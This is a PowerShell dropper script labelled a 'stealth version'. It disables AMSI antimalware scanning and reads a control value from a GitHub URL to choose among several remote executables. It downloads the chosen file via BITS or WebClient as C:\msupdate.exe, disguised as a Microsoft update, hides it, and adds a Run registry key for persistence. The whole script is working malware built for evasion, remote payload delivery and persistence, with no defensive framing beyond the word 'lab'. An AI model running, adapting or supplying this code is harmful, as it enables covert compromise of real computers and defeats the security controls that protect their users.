# Stealth version - less detectable
$ErrorActionPreference = 'SilentlyContinue'

# AMSI Bypass (common lab bypass)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Fast value check
$valueUrl = "https://raw.githubusercontent.com/mrxssmaster-bot/test/refs/heads/main/value.txt"
try {
    $val = [int](Invoke-WebRequest -Uri $valueUrl -UseBasicParsing -TimeoutSec 5).Content.Trim()
} catch { $val = 0 }

switch ($val) {
    0 { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
    1 { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace1.exe" }
    2 { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace2.exe" }
    default { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
}

# Target path
$finalPath = "C:\msupdate.exe"

# Download with BITS (more stealthy than WebClient in some cases)
try {
    Import-Module BitsTransfer -ErrorAction SilentlyContinue
    Start-BitsTransfer -Source $url -Destination $finalPath -Quiet
} catch {
    (New-Object System.Net.WebClient).DownloadFile($url, $finalPath)
}

# Hide + Persistence
attrib +h $finalPath 2>$null

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "MSUpdate" -Value $finalPath -Type String -Force

exit
